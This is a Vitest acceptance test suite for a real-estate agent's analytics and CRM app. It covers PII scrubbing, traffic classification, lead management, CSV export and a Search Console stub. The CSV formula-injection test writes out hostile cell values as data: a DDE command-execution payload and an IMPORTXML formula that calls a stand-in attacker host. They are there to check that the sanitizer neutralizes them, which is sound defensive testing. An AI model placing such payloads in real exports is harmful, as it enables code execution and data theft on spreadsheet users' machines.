import { describe, it, expect } from 'vitest';
import { 
  recordAnalyticsEvent, 
  getAnalyticsSummary, 
  scrubPII, 
  detectTrafficSource, 
  detectDeviceCategory,
  computeDelta
} from '../lib/analytics';
import { 
  getAllLeads, 
  getLeadById, 
  updateLead, 
  addLeadNote, 
  getLeadNotes, 
  getProperties 
} from '../lib/store';
import { sanitizeCsvCell, generateReportCsv } from '../lib/csv';
import { getGSCMetrics } from '../lib/gsc';

describe('MASTER PROMPT 03: Business Intelligence & CRM Acceptance Tests', () => {

  describe('1. Privacy-Conscious Visitor Tracking & PII Scrubbing', () => {
    it('Scrubs email addresses, phone numbers, and bearer tokens from analytics strings', () => {
      const dirtyUrl = '/properties/view?email=client@gmail.com&phone=(619)555-0142&token=bearer secret-123';
      const clean = scrubPII(dirtyUrl);
      expect(clean).not.toContain('client@gmail.com');
      expect(clean).toContain('[REDACTED_EMAIL]');
      expect(clean).not.toContain('(619)555-0142');
      expect(clean).toContain('[REDACTED_PHONE]');
      expect(clean).not.toContain('secret-123');
    });

    it('Correctly classifies traffic sources from referrer and UTM campaign tags', () => {
      expect(detectTrafficSource('https://www.google.com/search?q=edgar+valle')).toBe('organic');
      expect(detectTrafficSource('https://www.instagram.com/yourrealtoredgar/')).toBe('social');
      expect(detectTrafficSource('', 'instagram', 'bio_link')).toBe('social');
      expect(detectTrafficSource('', 'google', 'cpc')).toBe('paid');
      expect(detectTrafficSource('https://sandiegouniontribune.com/article')).toBe('referral');
      expect(detectTrafficSource(undefined, undefined, undefined)).toBe('direct');
    });

    it('Correctly classifies device categories from user-agents', () => {
      const iPhoneUA = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1';
      const macUA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36';
      const iPadUA = 'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148';

      expect(detectDeviceCategory(iPhoneUA)).toBe('mobile');
      expect(detectDeviceCategory(macUA)).toBe('desktop');
      expect(detectDeviceCategory(iPadUA)).toBe('tablet');
    });

    it('Validates event names and rejects unauthorized tracking events', async () => {
      // Valid event
      const validRes = await recordAnalyticsEvent({
        event_name: 'property_view',
        session_id: 'test-sess-100',
        page_path: '/properties/north-park-spanish-revival',
        property_id: 'a0000000-0000-0000-0000-000000000001'
      });
      expect(validRes.success).toBe(true);
      expect(validRes.eventId).toBeDefined();

      // Invalid event
      const invalidRes = await recordAnalyticsEvent({
        event_name: 'random_custom_event' as any,
        session_id: 'test-sess-101',
        page_path: '/properties'
      });
      expect(invalidRes.success).toBe(false);
      expect(invalidRes.error).toContain('Invalid event_name');
    });
  });

  describe('2. Business Intelligence Aggregations & Power BI Metrics', () => {
    it('Calculates delta percentages and trends correctly', () => {
      const up = computeDelta(150, 100);
      expect(up.deltaPercentage).toBe(50);
      expect(up.trend).toBe('up');

      const down = computeDelta(80, 100);
      expect(down.deltaPercentage).toBe(-20);
      expect(down.trend).toBe('down');

      const neutral = computeDelta(100, 100);
      expect(neutral.deltaPercentage).toBe(0);
      expect(neutral.trend).toBe('neutral');

      const zeroPrev = computeDelta(25, 0);
      expect(zeroPrev.deltaPercentage).toBe(100);
      expect(zeroPrev.trend).toBe('up');
    });

    it('Computes valid analytics summary for 30d date range with real metrics', async () => {
      const summary = await getAnalyticsSummary('30d');

      expect(summary.range).toBe('30d');
      expect(summary.page_views.current).toBeGreaterThan(0);
      expect(summary.sessions.current).toBeGreaterThan(0);
      expect(summary.unique_visitors.current).toBeGreaterThan(0);
      expect(summary.property_views.current).toBeGreaterThan(0);
      expect(summary.published_count).toBeGreaterThan(0);
      expect(summary.traffic_trend.length).toBeGreaterThan(0);
      expect(summary.traffic_sources.length).toBe(5);
      expect(summary.device_distribution.length).toBe(3);
      expect(summary.funnel.length).toBe(6);
      expect(summary.property_ranking.length).toBeGreaterThan(0);
    });

    it('Produces accurate conversion funnel drop-off and conversion rates', async () => {
      const summary = await getAnalyticsSummary('30d');
      const funnel = summary.funnel;

      expect(funnel[0].stage).toBe('visitors');
      expect(funnel[0].dropoffRate).toBe(0);
      expect(funnel[0].conversionRate).toBe(100);

      // Subsequent stages must have dropoff <= 100% and conversion rate <= 100%
      for (let i = 1; i < funnel.length; i++) {
        expect(funnel[i].dropoffRate).toBeGreaterThanOrEqual(0);
        expect(funnel[i].conversionRate).toBeLessThanOrEqual(funnel[i - 1].conversionRate);
      }
    });
  });

  describe('3. CRM Lead Lifecycle & Management', () => {
    it('Contains leads across Master Prompt 03 statuses', async () => {
      const leads = await getAllLeads();
      expect(leads.length).toBeGreaterThanOrEqual(8);

      const statuses = leads.map(l => l.status);
      expect(statuses).toContain('new');
      expect(statuses).toContain('contacted');
      expect(statuses).toContain('qualified');
      expect(statuses).toContain('appointment_scheduled');
      expect(statuses).toContain('in_progress');
      expect(statuses).toContain('converted');
      expect(statuses).toContain('lost');
      expect(statuses).toContain('spam');
    });

    it('Allows updating lead status, follow-up date, and admin notes', async () => {
      const leadId = 'lead-001';
      const targetFollowUp = new Date(Date.now() + 48 * 3600000).toISOString();

      const updateRes = await updateLead(leadId, {
        status: 'qualified',
        follow_up_date: targetFollowUp,
        admin_notes: 'Verified VA loan pre-approval letter and COE.'
      });
      expect(updateRes).toBe(true);

      const updated = await getLeadById(leadId);
      expect(updated?.status).toBe('qualified');
      expect(updated?.follow_up_date).toBe(targetFollowUp);
      expect(updated?.admin_notes).toContain('Verified VA loan');
    });

    it('Adds internal notes to lead with author and timestamp audit trail', async () => {
      const leadId = 'lead-002';
      const noteText = 'Client completed CalHFA homebuyer education course. Ready to submit offer on 30th St condo.';

      const noteRes = await addLeadNote(leadId, noteText, 'edgar@yourrealtoredgar.com');
      expect(noteRes.success).toBe(true);
      expect(noteRes.note).toBeDefined();
      expect(noteRes.note?.note).toBe(noteText);
      expect(noteRes.note?.author_email).toBe('edgar@yourrealtoredgar.com');

      const notes = await getLeadNotes(leadId);
      expect(notes.some(n => n.note === noteText)).toBe(true);
    });
  });

  describe('4. CSV Export Engine & Formula Injection Defense', () => {
    it('Neutralizes dangerous formula injection characters in spreadsheet exports', () => {
      // Cell values starting with =, +, -, @, \t, \r
      expect(sanitizeCsvCell('=SUM(A1:A10)')).toBe(`"'=SUM(A1:A10)"`);
      expect(sanitizeCsvCell('+1234567890')).toBe(`"'+1234567890"`);
      expect(sanitizeCsvCell('-cmd|"/C calc"!A0')).toBe(`"'-cmd|""/C calc""!A0"`);
      expect(sanitizeCsvCell('@IMPORTXML("http://evil.com")')).toBe(`"'@IMPORTXML(""http://evil.com"")"`);
      expect(sanitizeCsvCell('Normal Text')).toBe(`"Normal Text"`);
    });

    it('Generates all 8 authorized CSV reports with proper headers and data', async () => {
      const [properties, leads, analytics] = await Promise.all([
        getProperties({ includeUnpublished: true }),
        getAllLeads(),
        getAnalyticsSummary('30d')
      ]);

      const reportTypes = [
        'property_inventory',
        'traffic',
        'property_views_inquiries',
        'leads_by_date',
        'conversion_funnel',
        'traffic_sources',
        'listing_performance',
        'open_house_inquiries'
      ] as const;

      for (const repType of reportTypes) {
        const rep = generateReportCsv(repType, { properties, leads, analytics });
        expect(rep.filename).toMatch(/\.csv$/);
        expect(rep.csv.length).toBeGreaterThan(20);
        // Ensure header line exists
        const lines = rep.csv.split('\r\n');
        expect(lines.length).toBeGreaterThanOrEqual(1);
      }
    });
  });

  describe('5. Google Search Console Status Integration', () => {
    it('Reports clear unconfigured state when credentials are not supplied, without invented ranking data', async () => {
      const gsc = await getGSCMetrics();
      expect(gsc.connected).toBe(false);
      expect(gsc.statusMessage).toContain('not configured');
      expect(gsc.totalClicks).toBe(0);
      expect(gsc.totalImpressions).toBe(0);
      expect(gsc.topQueries.length).toBe(0);
    });
  });
});
